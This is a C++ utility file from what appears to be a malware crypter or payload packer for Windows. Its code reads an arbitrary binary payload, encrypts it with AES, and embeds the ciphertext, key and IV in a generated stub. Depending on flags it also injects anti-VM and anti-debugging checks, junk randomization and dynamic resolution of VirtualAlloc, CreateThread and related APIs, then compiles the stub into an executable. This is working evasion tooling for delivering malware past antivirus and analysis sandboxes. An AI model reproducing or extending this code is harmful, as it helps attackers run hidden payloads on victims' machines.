// utils.cpp
#include "utils.h"
#include "flags.h"
#include "constant.h"
/**/


// windows.h byte definition has conflicts

#include <iostream>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <cstring>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <filesystem>
#include <random>
#include <regex>

using namespace std;

/**/
void setColor(int color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}

void resetColor() {
    setColor(COLOR_DEFAULT);
}



string bytesToHexString(const vector<unsigned char> &bytes) {
    stringstream ss;
    ss << hex << setfill('0');
    for (size_t i = 0; i < bytes.size(); ++i) {
        ss << "0x" << setw(2) << static_cast<int>(bytes[i]);
        if (i < bytes.size() - 1) {
            ss << ", ";
        }
    }
    return ss.str();
}

string generateRandomString(size_t length) {
    const char charset[] =
        "abcdefghijklmnopqrstuvwxyz"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "0123456789";
    const size_t max_index = (sizeof(charset) - 1);
    string randomString(length, 0);
    random_device rd;
    mt19937 generator(rd());
    uniform_int_distribution<> distribution(0, max_index);

    for (size_t i = 0; i < length; ++i) {
        randomString[i] = charset[distribution(generator)];
    }

    return randomString;
}

// Returns bytes of binary
vector<unsigned char> readBinary(string &path_to_payload) {
    ifstream file(path_to_payload, ios::binary | ios::ate);
    setColor(COLOR_ERROR);
    if (!file) {
        cerr << "Could not open binary\n";
        resetColor();
        return {};
    }

    streamsize len = file.tellg();
    file.seekg(0, ios::beg);

    vector<char> buf(len);
    if (!file.read(buf.data(), len)) {
        std::cerr << "Error reading binary\n";
        resetColor();
        return {};
    }
    resetColor();
    file.close();
    
    // Convert from char vector to unsigned char vector 
    vector<unsigned char> payloadBytes(buf.begin(), buf.end());

    return payloadBytes;
}

pair <vector<unsigned char>, vector<unsigned char>> generateKeyAndIV(size_t keySize, size_t ivSize) {
    vector<unsigned char> key(keySize);
    vector<unsigned char> iv(ivSize);
    
    if (!RAND_bytes(key.data(), keySize) || !RAND_bytes(iv.data(), ivSize)) {
        setColor(COLOR_ERROR);
        cerr << "error generating key and IV\n";
        resetColor();
        exit(1);
    }

    return make_pair(key, iv);

}

vector<unsigned char> encrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    
    if (!ctx) {
        cerr << "Encryption CTX error\n";
        exit(1);
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_128_cfb8(), NULL, key.data(), iv.data()) != 1) {
        cerr << "Encryption error\n";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    vector<unsigned char> ciphertext(buf.size());
    int len;

    if (EVP_EncryptUpdate(ctx, ciphertext.data(), &len, buf.data(), buf.size()) != 1) {
        cerr << "Encryption failed\n";
        EVP_CIPHER_CTX_free(ctx);
        exit(1);
    }

    EVP_CIPHER_CTX_free(ctx);

    return ciphertext;
}


vector<unsigned char> decrypt(const vector<unsigned char> &buf, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        setColor(COLOR_ERROR);
        cerr << "Decryption CTX error\n";
        resetColor();
        exit(1);
    }

    if (EVP_DecryptInit_ex(ctx, EVP_aes_128_cfb8(), NULL, key.data(), iv.data()) != 1) {
        setColor(COLOR_ERROR);
        cerr << "Decryption error\n";
        EVP_CIPHER_CTX_free(ctx);
        resetColor();
        exit(1);
    }

    vector<unsigned char> plaintext(buf.size());
    int len;

    if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, buf.data(), buf.size()) != 1) {
        setColor(COLOR_ERROR);
        cerr << "Decryption failed\n";
        EVP_CIPHER_CTX_free(ctx);
        resetColor();
        exit(1);
    }

    EVP_CIPHER_CTX_free(ctx);

    return plaintext;
}
void checkMismatch(){

}


void writeStub(bool *flags, string &stubTemplatePath, string &outputDirPath, const vector<unsigned char> &payloadBytes, const vector<unsigned char> &key, const vector<unsigned char> &iv) {
    ifstream file(stubTemplatePath);
    if (!file) {
        setColor(COLOR_ERROR);
        cerr << "Could not open stub template\n";
        resetColor();
        exit(1);
    }
    
    string name = generateRandomString(8);
    filesystem::create_directories(outputDirPath);
    string outputPath = outputDirPath + "stub_" + name + ".cpp";

    ofstream outputFile(outputPath);
    if (!outputFile) {
        setColor(COLOR_ERROR);
        cerr << "Error writing stub\n";
        resetColor();
        exit(1);
    }
    cout << "\n";

    
    // Add flags that will be set for insertions
    // since all flags require two separate replacements the original flags array cannot be used
    bool insertions[INSERTION_COUNT] = {false};

    if(flags[RAND] == true){
        insertions[RAND_DEF_POS] = true;
        insertions[RAND_CALL_POS] = true;
    }
    if(flags[VM] == true){
        insertions[VM_DEF_POS] = true;
        insertions[VM_CALL_POS] = true;
    }
    if(flags[DB] == true){
        insertions[DB_DEF_POS] = true;
        insertions[DB_CALL_POS] = true;
    }
    if(flags[DYN] == true){
        insertions[DYN_GLOBALS_POS] = true;
        insertions[DYN_RESOLUTION_POS] = true;
    }


    string line;
    while (getline(file, line)) {
        size_t pos;

        if (flags[PDB] == true){
            if ((pos = line.find("bool DEBUG = false;")) != string::npos) {
                line.replace(pos, strlen("bool DEBUG = false;"), "bool DEBUG = true;");
            }  
        }

        // Replace placeholders with actual values
        if ((pos = line.find("/*ENCRYPTED_BYTES*/")) != string::npos) {
            line.replace(pos, strlen("/*ENCRYPTED_BYTES*/"), bytesToHexString(payloadBytes));
        }
        if ((pos = line.find("/*KEY*/")) != string::npos) {
            line.replace(pos, strlen("/*KEY*/"), bytesToHexString(key));
        } 
        if ((pos = line.find("/*IV*/")) != string::npos) {
            line.replace(pos, strlen("/*IV*/"), bytesToHexString(iv));
        } 

        // Check dynamic API resolution flag first so that anti vm api calls dont get updated in the case that both flags are set 
        if(flags[DYN] == true){
        
            // Replacing the API calls in execute() before the dynamic resolution logic is added, since the init needs 
            // LoadLibaryA to load kernel32.dll
            line = regex_replace(line, regex("\\bVirtualAlloc\\b"), "pVirtualAlloc");
            line = regex_replace(line, regex("\\bVirtualFree\\b"), "pVirtualFree");
            line = regex_replace(line, regex("\\bLoadLibraryA\\b"), "pLoadLibraryA");
            line = regex_replace(line, regex("\\bGetProcAddress\\b"), "pGetProcAddress");
            line = regex_replace(line, regex("\\bCreateThread\\b"), "pCreateThread");
            line = regex_replace(line, regex("\\bWaitForSingleObject\\b"), "pWaitForSingleObject");
            line = regex_replace(line, regex("\\bCloseHandle\\b"), "pCloseHandle");
        
            if(insertions[DYN_GLOBALS_POS]){
                if ((pos = line.find("/*DYN_GLOBALS*/")) != string::npos) {
                    line.replace(pos, strlen("/*DYN_GLOBALS*/"), DYN_GLOBALS);
                    cout << "Set dynamic API resolution globals successfully\n";
                    insertions[DYN_GLOBALS_POS] = false;
                }
            }
            if (insertions[DYN_RESOLUTION_POS]){
                if ((pos = line.find("/*DYN_RESOLUTION*/")) != string::npos) {
                    line.replace(pos, strlen("/*DYN_RESOLUTION*/"), DYN_RESOLUTION);
                    cout << "Set dynamic API resolution initialization successfully\n";
                    insertions[DYN_RESOLUTION_POS] = false;
                }
            }

            if((insertions[DYN_GLOBALS_POS] == false) && (insertions[DYN_RESOLUTION_POS] == false)){
                flags[DYN] = false;
            }
        }

        if (flags[RAND] == true){

            if(insertions[RAND_DEF_POS] == true){
                if ((pos = line.find("/*RAND_DEF*/")) != string::npos) {
                    line.replace(pos, strlen("/*RAND_DEF*/"), RAND_DEF);
                    cout << "Set rand def successfully\n";
                }
            }
            if(insertions[RAND_CALL_POS] == true){
                if ((pos = line.find("execute(payload);")) != string::npos) {
                    line.replace(pos, strlen("execute(payload);"), RAND_CALL);
                    cout << "Set rand call successfully\n";
                }
            }

            // dictionary in resource
            // choose random selection of words and populate large vector
            
            if((insertions[RAND_DEF_POS] == false) && (insertions[RAND_CALL_POS] == false)){
                flags[RAND] = false;
            }
        }
        
        if (flags[VM] == true){
            if(insertions[VM_DEF_POS] == true){
                if ((pos = line.find("/*VM_DEF*/")) != string::npos) {
                    line.replace(pos, strlen("/*VM_DEF*/"), ANTI_VM_DEF);
                    cout << "Set antiVM def successfully\n";
                }
            }
            if(insertions[VM_CALL_POS] == true){
                if ((pos = line.find("/*VM_CALL*/")) != string::npos) {
                    line.replace(pos, strlen("/*VM_CALL*/"), "antiVm();");
                    cout << "Set antiVM call successfully\n";
                }
            }
            if((insertions[VM_DEF_POS] == false) && (insertions[VM_CALL_POS] == false)){
                flags[VM] = false;
            }
        }

        if (flags[DB] == true){
            if(insertions[DB_DEF_POS] == true){
                if ((pos = line.find("/*DB_DEF*/")) != string::npos) {
                    line.replace(pos, strlen("/*DB_DEF*/"), DB_DEF);
                    cout << "Set antiDB def successfully\n";
                }
            }
            if(insertions[DB_CALL_POS] == true){
                if ((pos = line.find("/*DB_CALL*/")) != string::npos) {
                    line.replace(pos, strlen("/*DB_CALL*/"), "antiDb();");
                    cout << "Set antiDB call successfully\n";
                }
            }
            if((insertions[DB_CALL_POS] == false) && (insertions[DB_DEF_POS] == false)){
                flags[DB] = false;
            }
        }
        
        outputFile << line << endl;
    }

    // Check global arg flag and internal flag mismatches
    file.close();
    outputFile.close();

    cout << "Successfully wrote stub to: " << outputPath << "\n";

    if(flags[COMPILE] == true){
        setColor(COLOR_INFO);
        cout << "Compiling stub...\n";
        string tmp = "make out/stub_" + name + ".exe";
        const char *command = tmp.c_str();

        int out = system(command);
        if(out == 0){
            setColor(COLOR_SUCCESS);
            cout << "Compilation successful\n";
            cout << "->\t/out/stub_" << name << ".exe\n";
        } else {
            setColor(COLOR_ERROR);
            cerr << "system(" << command << ") failed with code " << out << "\n";
            resetColor();
            exit(1);
        }

    }
    resetColor();
}